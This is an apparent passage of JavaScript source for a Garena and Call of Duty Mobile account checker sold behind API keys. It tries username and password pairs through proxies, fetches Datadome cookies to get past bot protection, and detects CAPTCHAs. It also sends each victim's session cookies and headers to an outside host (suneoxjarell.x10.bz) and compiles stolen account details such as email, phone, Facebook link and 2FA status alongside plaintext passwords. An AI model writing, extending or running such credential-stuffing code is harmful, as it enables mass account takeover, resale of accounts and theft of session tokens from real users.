                const parts = response_codm_text_clean.split("|");
                if (/^\d+$/.test(parts[1]) && parts.every(p => p && p.trim() !== "N/A")) {
                     logging.info(`CODM SCRIPT SUCCESS: ${response_codm_text_clean}`);
                     return response_codm_text_clean;
                } else {
                     logging.warning(`CODM SCRIPT RETURNED PARSABLE BUT INVALID DATA: ${response_codm_text_clean}`);
                     return `[CODM WARN] SCRIPT DATA INVALID: ${response_codm_text_clean.substring(0,100)}`;
                }
            } else {
                 if (response_codm_text_clean.toLowerCase().includes("not found") || response_codm_text_clean.toLowerCase().includes("invalid token")) {
                     logging.warning(`CODM SCRIPT INDICATED ACCOUNT NOT LINKED OR INVALID TOKEN: ${response_codm_text_clean}`);
                     return `[CODM FAIL] ACCOUNT LIKELY NOT LINKED OR TOKEN INVALID.`;
                 } else if (response_codm_text_clean.toLowerCase().includes("error") || response_codm_text_clean.toLowerCase().includes("fail")) {
                      logging.warning(`CODM SCRIPT RETURNED ERROR: ${response_codm_text_clean}`);
                      return `[CODM FAIL] SCRIPT ERROR: ${response_codm_text_clean.substring(0,150)}`;
                 } else {
                      logging.warning(`CODM SCRIPT RETURNED UNEXPECTED FORMAT: ${response_codm_text_clean}`);
                      return `[CODM WARN] SCRIPT UNEXPECTED FORMAT: ${response_codm_text_clean.substring(0,100)}`;
                 }
            }
        } catch (e) {
             const err_str = strip_ansi_codes(e.message);
             const resp_text = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
             if (detect_captcha_in_response(err_str) || detect_captcha_in_response(resp_text)) {
                 logging.warning(`CAPTCHA DETECTED DURING EXTERNAL CODM SCRIPT REQUEST ERROR: ${err_str}`);
                 return "[🤖] CAPTCHA DETECTED (CODM EXTERNAL SCRIPT REQUEST ERROR)";
             }
             if (e.code === 'ECONNABORTED') return "[⏱️] [CODM FAIL] CODM CHECK SCRIPT REQUEST TIMED OUT.";
             logging.error(`ERROR CONTACTING CODM CHECK SCRIPT: ${e.message}`);
             return `[CODM FAIL] ERROR CONTACTING CHECK SCRIPT: ${err_str.substring(0,100)}`;
        }

    } catch (e) {
        const err_str = strip_ansi_codes(e.message);
        const resp_text = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
        const status_code = e.response ? e.response.status : null;
        const error_detail = `${err_str.substring(0,100)}` + (status_code ? ` (STATUS: ${status_code})` : "");

        if (detect_captcha_in_response(err_str) || detect_captcha_in_response(resp_text)) {
            logging.warning(`CAPTCHA DETECTED DURING CODM CALLBACK REQUEST ERROR: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (CODM CALLBACK REQUEST ERROR)";
        }
        if (e.code === 'ECONNABORTED') {
            logging.error("CODM CALLBACK REQUEST TIMED OUT.");
            return "[⏱️] [CODM FAIL] CODM CALLBACK REQUEST TIMED OUT.";
        }
        logging.warning(`CODM CALLBACK REQUEST ERROR: ${e.message}`);
        return `[CODM FAIL] CALLBACK REQUEST ERROR: ${error_detail}`;
    }
}


async function check_login(account_username, _id, encryptedpassword, password, selected_header, cookies, dataa, date, proxies = null, timeout = REQUEST_TIMEOUT) {
    let current_cookies = { ...cookies };

    if (dataa) {
        current_cookies["datadome"] = dataa;
    } else {
        const manual_datadome_result = await get_datadome_cookie(proxies, timeout);
        if (typeof manual_datadome_result === 'string' && !/^\[[🤖⚠️⏱️🔴]\]/.test(manual_datadome_result)) {
            current_cookies["datadome"] = manual_datadome_result;
        } else if (manual_datadome_result && manual_datadome_result.startsWith("[🤖]")) {
            logging.warning(`MANUAL DATADOME FETCH FOR LOGIN FAILED WITH CAPTCHA: ${manual_datadome_result}`);
            return manual_datadome_result;
        } else if (manual_datadome_result) {
            logging.warning(`MANUAL DATADOME FETCH FOR LOGIN FAILED: ${manual_datadome_result}. PROCEEDING CAUTIOUSLY.`);
             if (manual_datadome_result.startsWith("[⏱️]") || manual_datadome_result.startsWith("[🔴]")) {
                 return manual_datadome_result;
             }
        } else {
            logging.warning(`MANUAL DATADOME FETCH FOR LOGIN RETURNED NONE/EMPTY FOR ${account_username}. PROCEEDING WITHOUT.`);
        }
    }
    
    const login_params_obj = {
        'app_id': '100082', 'account': account_username, 'password': encryptedpassword,
        'redirect_uri': REDIRECT_URL, 'format': 'json', 'id': _id,
    };
    const login_url = APK_URL + urllib.parse.urlencode(login_params_obj);

    let response;
    try {
        const cookieString = Object.entries(current_cookies).map(([k, v]) => `${k}=${v}`).join('; ');
        const axiosConfig = {
            headers: { ...selected_header, 'Cookie': cookieString },
            proxy: buildAxiosProxyConfig(proxies),
            timeout: timeout * 1000,
        };
        response = await axios.get(login_url, axiosConfig);
        const response_text_clean = strip_ansi_codes(String(response.data));

        if (detect_captcha_in_response(response_text_clean)) {
            logging.warning(`CAPTCHA DETECTED IN LOGIN RESPONSE BODY FOR ${account_username}.`);
            return "[🤖] CAPTCHA DETECTED (LOGIN RESPONSE BODY)";
        }
    } catch (e) {
        const response_text_clean_on_error = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
        if (e.response && e.response.status >= 400 && detect_captcha_in_response(response_text_clean_on_error)) {
             logging.warning(`CAPTCHA DETECTED IN LOGIN HTTP ERROR ${e.response.status} BODY FOR ${account_username}.`);
             return "[🤖] CAPTCHA DETECTED (LOGIN HTTP ERROR BODY)";
        }
        if (e.code === 'ECONNABORTED') {
            if (e.message.toLowerCase().includes('connect etimedout')) {
                logging.error(`LOGIN CONNECTION TIMED OUT FOR ${account_username} (PROXY/NETWORK ISSUE).`);
                return "[⏱️] LOGIN CONNECT TIMEOUT";
            }
            logging.error(`LOGIN READ TIMED OUT FOR ${account_username} (SERVER SLOW TO RESPOND).`);
            return "[⏱️] LOGIN READ TIMEOUT";
        }
        if (e.isAxiosError && !e.response) {
            logging.error(`LOGIN CONNECTION ERROR FOR ${account_username}: ${e.message}`);
            return "[🔴] CONNECTION ERROR - SERVER REFUSED";
        }
        if (e.response) {
            const status_code = e.response.status;
            if (status_code === 403) return "[🚫] LOGIN FORBIDDEN (403)";
            if (status_code === 429) return "[🚦] RATE LIMITED (429)";
            logging.warning(`LOGIN HTTP ERROR ${status_code} FOR ${account_username}: ${strip_ansi_codes(String(e.response.data)).substring(0,200)}`);
            return `[📉] LOGIN HTTP ERROR ${status_code}`;
        }
        const err_str = strip_ansi_codes(e.message);
        if (detect_captcha_in_response(err_str)) {
            logging.warning(`CAPTCHA DETECTED DURING LOGIN REQUEST ERROR FOR ${account_username}: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (LOGIN REQUEST ERROR)";
        }
        logging.error(`LOGIN REQUEST FAILED FOR ${account_username}: ${e.message}`);
        return `[⚠️] LOGIN REQUEST FAILED: ${err_str.substring(0,100)}`;
    }

    let login_json_response;
    try {
        login_json_response = (typeof response.data === 'object') ? response.data : json.parse(response.data);
    } catch (jsonError) {
        logging.error(`INVALID LOGIN JSON FOR ${account_username}: ${String(response.data).substring(0,200)}`);
        return `[💢] INVALID LOGIN JSON RESPONSE`;
    }

    if (login_json_response.error) {
        const error_msg = login_json_response.error;
        logging.warning(`LOGIN ERROR FIELD FOR ${account_username}: ${error_msg}`);
        if (detect_captcha_in_response(error_msg)) {
            return "[🤖] CAPTCHA REQUIRED (LOGIN ERROR FIELD)";
        }
        if (error_msg.includes("error_password")) return "[⛔] INCORRECT PASSWORD"; 
        if (error_msg.includes("error_account_does_not_exist")) return "[👻] ACCOUNT DOESN'T EXIST";
        if (error_msg.includes("error_account_not_activated")) return "[⏳] ACCOUNT NOT ACTIVATED";
        return `[🚫] LOGIN ERROR: ${error_msg}`;
    }

    if (!login_json_response.session_key) {
         logging.error(`LOGIN RESPONSE MISSING SESSION_KEY FOR ${account_username}: ${json.stringify(login_json_response)}`);
         return "[❌] LOGIN FAILED: NO SESSION KEY RECEIVED";
    }

    const session_key = login_json_response.session_key;
    const newCookiesFromLogin = parseSetCookies(response.headers['set-cookie']);
    current_cookies = { ...current_cookies, ...newCookiesFromLogin };
    logging.info(`GARENA LOGIN SUCCESSFUL FOR ${account_username}. SESSION KEY OBTAINED.`);
    
    const hider = {
        'Host': 'account.garena.com', 'Connection': 'keep-alive',
        'User-Agent': selected_header["User-Agent"] || "Mozilla/5.0",
        'Accept': 'application/json, text/plain, */*',
        'Referer': `https://account.garena.com/?session_key=${session_key}`,
        'Accept-Language': 'en-US,en;q=0.9',
    };
    for (const key in selected_header) {
        if (key.toLowerCase().startsWith('sec-ch-ua')) {
            hider[key] = selected_header[key];
        }
    }

    const init_url = 'https://suneoxjarell.x10.bz/jajak.php';
    const params_for_script = {};
    for (const [k, v] of Object.entries(current_cookies)) { params_for_script[`coke_${k}`] = v; }
    for (const [k, v] of Object.entries(hider)) {
        const safe_k = k.replace(/-/g, '_').toLowerCase();
        params_for_script[`hider_${safe_k}`] = v;
    }

    let init_json_response = null;
    let init_text_clean = "";
    try {
        const init_response = await axios.get(init_url, { 
            params: params_for_script, 
            proxy: buildAxiosProxyConfig(proxies), 
            timeout: timeout * 1000 
        });
        init_text_clean = strip_ansi_codes(String(init_response.data));

        if (detect_captcha_in_response(init_text_clean)) {
             logging.warning(`CAPTCHA DETECTED IN ACC INFO SCRIPT RESPONSE FOR ${account_username}.`);
             return "[🤖] CAPTCHA DETECTED (ACC INFO SCRIPT RESPONSE)";
        }
        if (init_response.status < 200 || init_response.status >=300) throw new Error(`HTTP Error ${init_response.status}`);
        
        const potential_json = init_text_clean.trim();
        if (potential_json.startsWith('{') && potential_json.endsWith('}')) {
            init_json_response = json.parse(potential_json);
        } else {
             const json_match = /({.*?})/s.exec(potential_json);
             if (json_match) {
                 try {
                     init_json_response = json.parse(json_match[1]);
                 } catch (e) {
                     logging.error(`FAILED PARSING JSON FOUND WITHIN ACC INFO SCRIPT RESPONSE FOR ${account_username}: ${json_match[1].substring(0,200)}`);
                     return `[🧩] FAILED TO PARSE ACCOUNT INFO RESPONSE (INVALID JSON WITHIN TEXT)`;
                 }
             } else {
                 logging.error(`FAILED PARSING ACC INFO (NOT JSON OR NO JSON FOUND) FOR ${account_username}: ${init_text_clean.substring(0,200)}`);
                 return `[🧩] FAILED TO PARSE ACCOUNT INFO RESPONSE (NOT VALID JSON)`;
             }
        }
    } catch (e) {
        const err_str = strip_ansi_codes(e.message);
        const resp_text = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
        if (detect_captcha_in_response(err_str) || detect_captcha_in_response(resp_text)) {
            logging.warning(`CAPTCHA DETECTED DURING ACC INFO SCRIPT REQUEST ERROR FOR ${account_username}: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (ACC INFO SCRIPT REQUEST ERROR)";
        }
        if (e.code === 'ECONNABORTED') {
            logging.error(`ACCOUNT INFO SCRIPT TIMED OUT FOR ${account_username}`);
            return "[⏱️] ACCOUNT INFO SCRIPT TIMEOUT";
        }
        logging.error(`ACCOUNT INFO SCRIPT REQUEST FAILED FOR ${account_username}: ${e.message}`);
        return `[📡] ACCOUNT INFO SCRIPT REQUEST FAILED: ${err_str.substring(0,100)}`;
    }

    if (typeof init_json_response !== 'object' || init_json_response === null) {
        logging.error(`ACCOUNT INFO PROCESSING FAILED - RESPONSE WAS NOT A DICTIONARY FOR ${account_username}`);
        return "[🧩] FAILED TO PROCESS ACCOUNT INFO RESPONSE (INVALID STRUCTURE)";
    }

    if (init_json_response.error || init_json_response.success === false ) {
        const error_detail = init_json_response.error || init_json_response.message || 'UNKNOWN ERROR FROM ACC INFO SCRIPT';
        const clean_error_detail = strip_ansi_codes(String(error_detail));
        logging.warning(`ACCOUNT INFO SCRIPT RETURNED ERROR FOR ${account_username}: ${clean_error_detail}`);
        if (detect_captcha_in_response(clean_error_detail)) {
            return "[🤖] CAPTCHA REQUIRED (ACC INFO SCRIPT ERROR FIELD)";
        }
        return `[❓] ACCOUNT INFO ERROR: ${clean_error_detail.substring(0,150)}`;
    }
    
    const bindings = init_json_response.bindings || [];
    const account_status = strip_ansi_codes(String(init_json_response.status || 'Unknown'));
    let country = "N/A", last_login = "N/A", last_login_where = "N/A", avatar_url = "N/A";
    let fb_name = "N/A", fb_link = "N/A", mobile = "N/A", email = "N/A";
    let facebook_bound = "False", email_verified = "False", authenticator_enabled = "False", two_step_enabled = "False";
    let shell = "0", ckz_count = "UNKNOWN", last_login_ip = "N/A";

    if (Array.isArray(bindings)) {
        for (const binding_item_str of bindings) {
            const binding_clean = strip_ansi_codes(String(binding_item_str));
            if (binding_clean.includes(":")) {
                try {
                    const [key_raw, ...value_parts] = binding_clean.split(":");
                    const key = key_raw.trim().toLowerCase(); 
                    const value = value_parts.join(":").trim();
                    if (!value) continue;
                    
                    if (key === "country") country = value;
                    else if (key === "lastlogin" && !key.includes("from") && !key.includes("ip")) last_login = value;
                    else if (key === "lastloginfrom") last_login_where = value;
                    else if (key === "lastloginip") last_login_ip = value;
                    else if (key === "ckz") ckz_count = value;
                    else if (key === "garena shells") {
                        const shell_match = /(\d+)/.exec(value);
                        shell = shell_match ? shell_match[1] : "0";
                    }
                    else if (key === "facebook account" && value !== "N/A") { fb_name = value; facebook_bound = "True"; }
                    else if (key === "fb link") fb_link = value;
                    else if (key === "avatar") avatar_url = value;
                    else if (key === "mobile number" && value !== "N/A") mobile = value;
                    else if (key === "tae") email_verified = value.toLowerCase().includes("yes") ? "True" : "False";
                    else if (key === "eta" && value !== "N/A") email = value;
                    else if (key === "authenticator") authenticator_enabled = value.toLowerCase().includes("enabled") ? "True" : "False";
                    else if (key === "two-step verification") two_step_enabled = value.toLowerCase().includes("enabled") ? "True" : "False";
                } catch (parse_err) {
                    logging.warning(`ERROR PARSING BINDING LINE FOR ${account_username}: '${binding_clean}' - ${parse_err.message}`);
                }
            }
        }
    } else {
        logging.warning(`BINDINGS DATA FROM SCRIPT WAS NOT A LIST FOR ${account_username}: ${bindings}`);
    }
    
    const original_binding_country = country;
    if (!country || ["N/A", "UNKNOWN", "NONE", ""].includes(country.toUpperCase())) {
        country = "UNKNOWN";
        if (last_login_where && last_login_where !== "N/A") {
            const llw_upper = last_login_where.toUpperCase();
            const parts = llw_upper.split(',').map(p => p.trim());
            const potential_country_name_from_llw = parts[parts.length - 1];
            const mapped_from_llw = GARENA_COUNTRY_MAP[potential_country_name_from_llw];
            if (mapped_from_llw) {
                country = mapped_from_llw;
            } else {
                let found_in_llw_broad = false;
                for (const p_part of parts) {
                    const mapped_from_part = GARENA_COUNTRY_MAP[p_part];
                    if (mapped_from_part) {
                        country = mapped_from_part;
                        found_in_llw_broad = true; break;
                    }
                }
                if (!found_in_llw_broad && original_binding_country && !["N/A", "UNKNOWN", "NONE", ""].includes(original_binding_country.toUpperCase())) {
                    country = original_binding_country.toUpperCase();
                }
            }
        }
    } else {
        const normalized = GARENA_COUNTRY_MAP[country.toUpperCase()];
        if (normalized) {
            country = normalized;
        } else {
            country = country.toUpperCase();
        }
    }
    
    const grant_cookies = {};
    ['datadome', 'sso_key'].forEach(key => {
        if (current_cookies[key]) grant_cookies[key] = current_cookies[key];
    });

    const grant_headers = {
        "Host": "auth.garena.com", "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://auth.garena.com", "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
        "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=" + urllib.parse.quote(REDIRECT_URL),
        "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "en-US,en;q=0.9",
        "User-Agent": selected_header["User-Agent"] || "Mozilla/5.0",
    };
    for (const key in selected_header) {
        if (key.toLowerCase().startsWith('sec-ch-ua')) {
            grant_headers[key] = selected_header[key];
        }
    }
    const grant_data_payload_obj = {"client_id": "100082", "response_type": "token", "redirect_uri": REDIRECT_URL, "format": "json", "id": _id};
    const grant_data_payload_str = urllib.parse.urlencode(grant_data_payload_obj);

    let grant_response;
    try {
        const grant_url = "https://auth.garena.com/oauth/token/grant";
        const cookieStringGrant = Object.entries(grant_cookies).map(([k, v]) => `${k}=${v}`).join('; ');

        grant_response = await axios.post(grant_url, grant_data_payload_str, {
            headers: { ...grant_headers, 'Cookie': cookieStringGrant },
            proxy: buildAxiosProxyConfig(proxies),
            timeout: timeout * 1000
        });
        const grant_text_clean = strip_ansi_codes(String(grant_response.data));

        if (detect_captcha_in_response(grant_text_clean)) {
            logging.warning(`CAPTCHA DETECTED IN GRANT TOKEN RESPONSE BODY FOR ${account_username}.`);
            return "[🤖] CAPTCHA DETECTED (GRANT TOKEN RESPONSE BODY)";
        }
        const grant_data_json = (typeof grant_response.data === 'object') ? grant_response.data : json.parse(grant_response.data);

        if (grant_data_json.error) {
            const error_msg = grant_data_json.error;
            logging.warning(`GRANT TOKEN ERROR FIELD FOR ${account_username}: ${error_msg}`);
            if (detect_captcha_in_response(error_msg)) {
                return "[🤖] CAPTCHA REQUIRED (GRANT TOKEN ERROR FIELD)";
            }
            return `[🔑] GRANT TOKEN FAILED: ${error_msg}`;
        }

        if (!grant_data_json.access_token) {
            logging.error(`GRANT TOKEN RESPONSE MISSING ACCESS_TOKEN FOR ${account_username}: ${json.stringify(grant_data_json)}`);
            return "[❓] GRANT TOKEN RESPONSE MISSING 'access_token'";
        }

        const access_token = grant_data_json.access_token;
        const newCookiesFromGrant = parseSetCookies(grant_response.headers['set-cookie']);
        current_cookies = { ...current_cookies, ...newCookiesFromGrant };
        logging.info(`ACCESS TOKEN GRANTED FOR ${account_username}.`);
        
        const codm_check_cookies = {};
        ['datadome', 'sso_key', 'token_session'].forEach(key => {
            if (current_cookies[key]) codm_check_cookies[key] = current_cookies[key];
        });
        
        const codm_result_str = await show_level(access_token, selected_header, codm_check_cookies, proxies, timeout);

        if (codm_result_str.startsWith("[🤖]")) {
             logging.warning(`CODM CHECK PHASE RETURNED CAPTCHA FOR ${account_username}: ${codm_result_str}`);
             return codm_result_str;
        }
        if (/^\[(CODM FAIL|CODM WARN|⏱️)\]/.test(codm_result_str)) {
            logging.warning(`CODM CHECK FAILED OR WARNED FOR ${account_username}: ${codm_result_str}`);
            return ["CODM_FAILURE", account_username, password, codm_result_str];
        }

        let codm_nickname = "N/A", codm_level_str = "N/A", codm_region = "N/A", uid = "N/A";
        const connected_games_list_for_json = [];

        if (codm_result_str.includes("|") && codm_result_str.split("|").length === 4) {
            const parts = codm_result_str.split("|");
            [codm_nickname, codm_level_str, codm_region, uid] = parts;
            
            if (/^\d+$/.test(codm_level_str) && codm_nickname && codm_region && uid &&
               [codm_nickname, codm_region, uid].every(p => p.trim() && p.trim().toLowerCase() !== "n/a")) {
                connected_games_list_for_json.push({
                    "game": "CODM", "region": codm_region, "level": codm_level_str,
                    "nickname": codm_nickname, "uid": uid
                });
            } else {
                const reason = `[CODM WARN] PARSED INVALID CODM DATA: ${codm_result_str.substring(0,100)}`;
                logging.warning(`CODM CHECK FOR ${account_username} RESULTED IN: ${reason}`);
                return ["CODM_FAILURE", account_username, password, reason];
            }
        } else {
            const reason = `[CODM WARN] UNEXPECTED CODM DATA FORMAT: ${codm_result_str.substring(0,100)}`;
            logging.warning(`CODM CHECK FOR ${account_username} RESULTED IN: ${reason}`);
            return ["CODM_FAILURE", account_username, password, reason];
        }
        
        const result_dict = format_result_dict(
            last_login, last_login_where, country, shell, avatar_url, mobile,
            facebook_bound, email_verified, authenticator_enabled, two_step_enabled,
            connected_games_list_for_json, fb_name, fb_link, email, date,
            account_username, password, ckz_count, last_login_ip, account_status
        );
        logging.info(`FULL CHECK SUCCESSFUL FOR ${account_username}. LEVEL: ${codm_level_str}`);
        return result_dict;

    } catch (e) {
        const grant_text_clean_on_error = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
        const err_str = strip_ansi_codes(e.message);
        
        if (detect_captcha_in_response(err_str) || detect_captcha_in_response(grant_text_clean_on_error)) {
            logging.warning(`CAPTCHA DETECTED DURING GRANT TOKEN REQUEST ERROR FOR ${account_username}: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (GRANT TOKEN REQUEST ERROR)";
        }
        if (e.code === 'ECONNABORTED') {
            logging.error(`GRANT TOKEN REQUEST TIMED OUT FOR ${account_username}`);
            return "[⏱️] GRANT TOKEN REQUEST TIMED OUT.";
        }
        if (e.isAxiosError && e.response && e.response.data && typeof e.response.data !== 'object') {
            try {
                json.parse(e.response.data); // Check if it's a JSON string
            } catch (jsonErr) {
                 logging.error(`FAILED TO DECODE GRANT TOKEN JSON FOR ${account_username}: ${String(e.response.data).substring(0,200)} - ERROR: ${jsonErr.message}`);
                 return `[📄] GRANT TOKEN FAILED: NON-JSON RESPONSE (${jsonErr.message})`;
            }
        }
        logging.error(`GRANT TOKEN REQUEST ERROR FOR ${account_username}: ${e.message}`);
        return `[🌐] GRANT TOKEN REQUEST ERROR: ${err_str.substring(0,100)}`;
    }
}

function format_result_dict(last_login, last_login_where, country, shell_str, avatar_url, mobile,
                       facebook_bound_str, email_verified_str, authenticator_enabled_str, two_step_enabled_str,
                       connected_games_data, fb_name, fb_link, email, date,
                       username, password, ckz_count, last_login_ip, account_status) {
    
    let codm_info_json = {"status": "NO CODM INFO PARSED", "level": null};
    if (connected_games_data && connected_games_data.length > 0) {
        const game_data = connected_games_data[0];
        if (game_data.game === "CODM") {
            let level_val = null;
            try { level_val = parseInt(game_data.level, 10); if(isNaN(level_val)) level_val = null; }
            catch (e) { /* ignore */ }
            codm_info_json = {
                "status": "LINKED", "game": "CODM", "region": game_data.region,
                "level": level_val, "nickname": game_data.nickname, "uid": game_data.uid
            };
        }
    }
    let shell_value = 0;
    try { shell_value = parseInt(shell_str, 10); if(isNaN(shell_value)) shell_value = 0; }
    catch (e) { /* ignore */ }

    function clean_na(value) {
        return (value && !["N/A", "unknown", "UNKNOWN"].includes(String(value))) ? value : null;
    }

    const result_data = {
        "checker_by": "S1N | TG: @YISHUX",
        "timestamp_utc": DateTime.now().toISO(),
        "check_run_id": date, // This was a timestamp from original bulk
        "username": username, "password": password, // Consider omitting password from final API response for security
        "account_status_garena": clean_na(account_status),
        "account_country": clean_na(country),
        "garena_shells": shell_value,
        "avatar_url": clean_na(avatar_url),
        "last_login_time": clean_na(last_login),
        "last_login_location": clean_na(last_login_where),
        "last_login_ip": clean_na(last_login_ip),
        "bindings": {
            "mobile_number": clean_na(mobile),
            "email_address": clean_na(email),
            "facebook_name": clean_na(fb_name),
            "facebook_link": clean_na(fb_link),
        },
        "security": {
            "mobile_bound": !!clean_na(mobile),
            "email_verified": email_verified_str === "True",
            "facebook_linked": facebook_bound_str === "True",
            "google_authenticator_enabled": authenticator_enabled_str === "True",
            "two_step_verification_enabled": two_step_enabled_str === "True",
        },
        "codm_details": codm_info_json,
        "ckz_count": ckz_count !== "UNKNOWN" ? clean_na(ckz_count) : null,
    };
    return result_data;
}

async function check_account(username, password, date, initial_cookies_tuple, proxies = null, datadome_for_prelogin_attempt = null, timeout = REQUEST_TIMEOUT) {
    try {
        const random_id = String(random.randint(100000000000, 999999999999));
        const [initial_cookies_from_system, headers] = get_request_data(initial_cookies_tuple); 
        let prelogin_request_cookies = { ...initial_cookies_from_system };

        if (datadome_for_prelogin_attempt) {
            prelogin_request_cookies['datadome'] = datadome_for_prelogin_attempt;
        }

        const params_obj = {"app_id": "100082", "account": username, "format": "json", "id": random_id};
        const prelogin_url = "https://auth.garena.com/api/prelogin";
        let v1 = null, v2 = null;
        let encrypted_password_val = null;
        let datadome_from_prelogin_response = null;
        let response_prelogin = null;

        try {
            const cookieStringPrelogin = Object.entries(prelogin_request_cookies).map(([k, v]) => `${k}=${v}`).join('; ');
            response_prelogin = await axios.get(prelogin_url, {
                params: params_obj,
                headers: { ...headers, 'Cookie': cookieStringPrelogin },
                proxy: buildAxiosProxyConfig(proxies),
                timeout: timeout * 1000
            });
            const prelogin_text_clean = strip_ansi_codes(String(response_prelogin.data));
            const newCookiesFromPrelogin = parseSetCookies(response_prelogin.headers['set-cookie']);
            datadome_from_prelogin_response = newCookiesFromPrelogin['datadome'] || null;

            if (detect_captcha_in_response(prelogin_text_clean)) {
                 logging.warning(`CAPTCHA DETECTED IN PRELOGIN RESPONSE BODY FOR ${username}.`);
                 return "[🤖] CAPTCHA DETECTED (PRELOGIN RESPONSE BODY)";
            }
        } catch (e) {
            const prelogin_text_clean_on_error = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
            if (e.response && e.response.status >= 400 && detect_captcha_in_response(prelogin_text_clean_on_error)) {
                 logging.warning(`CAPTCHA DETECTED IN PRELOGIN HTTP ERROR ${e.response.status} BODY FOR ${username}.`);
                 return "[🤖] CAPTCHA DETECTED (PRELOGIN HTTP ERROR BODY)";
            }
            if (e.code === 'ECONNABORTED') {
                logging.error(`PRELOGIN TIMED OUT FOR ${username}`);
                return "[⏱️] PRELOGIN TIMED OUT";
            }
            if (e.response) {
                 const status_code = e.response.status;
                 if (status_code === 403) return `[🚫] PRELOGIN FORBIDDEN (403)`;
                 if (status_code === 429) return "[🚦] PRELOGIN RATE LIMITED (429)";
                 logging.warning(`PRELOGIN HTTP ERROR ${status_code} FOR ${username}: ${strip_ansi_codes(String(e.response.data)).substring(0,200)}`);
                 return `[📉] PRELOGIN HTTP ERROR ${status_code}`;
            }
            const err_str = strip_ansi_codes(e.message);
            if (detect_captcha_in_response(err_str)) {
                 logging.warning(`CAPTCHA DETECTED DURING PRELOGIN REQUEST ERROR FOR ${username}: ${err_str}`);
                 return "[🤖] CAPTCHA DETECTED (PRELOGIN REQUEST ERROR)";
            }
            logging.error(`PRELOGIN REQUEST FAILED FOR ${username}: ${e.message}`);
            if (err_str.includes("SOCKSHTTPSConnectionPool") || err_str.includes("Proxy Authentication Required") || err_str.includes("Cannot connect to proxy") || err_str.includes("Connection refused")) {
                return `[🔌] PROXY CONNECTION ERROR: ${err_str.substring(0,100)}`;
            }
            return `[🔌] PRELOGIN REQUEST FAILED: ${err_str.substring(0,100)}`;
        }

        let data_prelogin;
        try {
            data_prelogin = (typeof response_prelogin.data === 'object') ? response_prelogin.data : json.parse(response_prelogin.data);
        } catch (jsonError) {
             logging.error(`INVALID PRELOGIN JSON FOR ${username}: ${String(response_prelogin.data).substring(0,200)}`);
             return `[🧩] INVALID PRELOGIN JSON`;
        }

        if (data_prelogin.error) {
            const error_msg = data_prelogin.error;
            logging.warning(`PRELOGIN ERROR FIELD FOR ${username}: ${error_msg}`);
            if (detect_captcha_in_response(error_msg)) {
                 return "[🤖] CAPTCHA REQUIRED (PRELOGIN ERROR FIELD)";
            }
            if (error_msg === 'error_account_does_not_exist') return "[👻] ACCOUNT DOESN'T EXIST";
            return `[❗] PRELOGIN ERROR: ${error_msg}`;
        }

        v1 = data_prelogin.v1;
        v2 = data_prelogin.v2;
        if (!v1 || !v2) {
            logging.error(`PRELOGIN DATA MISSING V1/V2 FOR ${username}: ${json.stringify(data_prelogin)}`);
            return "[⚠️] PRELOGIN DATA MISSING (V1/V2)";
        }

        encrypted_password_val = get_encrypted_password(password, v1, v2);
        let datadome_for_login_step = null;
        if (datadome_from_prelogin_response && typeof datadome_from_prelogin_response === 'string' &&
           !/^\[[🤖⚠️]\]/.test(datadome_from_prelogin_response)) {
            datadome_for_login_step = datadome_from_prelogin_response;
            save_datadome_to_storage(datadome_for_login_step);
        } else if (datadome_for_prelogin_attempt) {
            datadome_for_login_step = datadome_for_prelogin_attempt;
        }

        let login_step_cookies = { ...initial_cookies_from_system };
        if (response_prelogin && response_prelogin.headers['set-cookie']) {
            const newCookiesFromPreloginAgain = parseSetCookies(response_prelogin.headers['set-cookie']);
            for (const cookieName in newCookiesFromPreloginAgain) {
                if (cookieName !== 'datadome') { 
                    login_step_cookies[cookieName] = newCookiesFromPreloginAgain[cookieName];
                }
            }
        }
        
        const login_result = await check_login(
            username, random_id,
            encrypted_password_val,
            password,
            headers, 
            login_step_cookies,
            datadome_for_login_step, 
            date, proxies, timeout
        );
        return login_result;

    } catch (e) {
        const err_str = strip_ansi_codes(e.message);
        if (detect_captcha_in_response(err_str)) {
            logging.warning(`CAPTCHA DETECTED DURING UNEXPECTED ERROR IN check_account FOR ${username}.`);
            return "[🤖] CAPTCHA DETECTED (check_account UNEXPECTED)";
        }
        if (e instanceof ReferenceError && (e.message.includes('encrypted_password') || e.message.includes('encryptedpassword'))) {
            logging.critical(`CRITICAL LOGIC FLAW: PASSWORD ENCRYPTION VARIABLE NOT DEFINED BEFORE USE IN check_account FOR ${username}. ERROR: ${e.message}`, e);
            return "[💥] INTERNAL ERROR: PASSWORD ENCRYPTION STATE INVALID.";
        }
        logging.exception(`UNEXPECTED ERROR IN check_account FOR ${username}:`, e);
        return `[💥] UNEXPECTED ERROR IN check_account: ${err_str.substring(0,100)}`;
    }
}

function htmlEscape(text) { // Renamed to avoid conflict with 'he' module if used elsewhere
    if (typeof text !== 'string') return text;
    return text
        .replace(/&/g, '&')
        .replace(/</g, '<')
        .replace(/>/g, '>')
        .replace(/"/g, '"')
        .replace(/'/g, "'");
}


// --- Express API Setup ---
const express = require('express');
const apiKeyManager = require('./api_keys_manager'); // Your API key manager
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true })); // For form data in POST if needed

// Middleware for API Key Validation
const apiKeyMiddleware = (req, res, next) => {
    const apiKey = req.query.apikey || req.body.apikey || req.headers['x-api-key'];
    if (!apiKey) {
        logging.warning("API call attempt without API key.");
        return res.status(401).json({ error: "API key is required." });
    }

    const validationResult = apiKeyManager.validateAndConsumeApiKey(apiKey);
    if (!validationResult.valid) {
        logging.warning(`API key validation failed for key '${apiKey.substring(0,5)}...': ${validationResult.message}`);
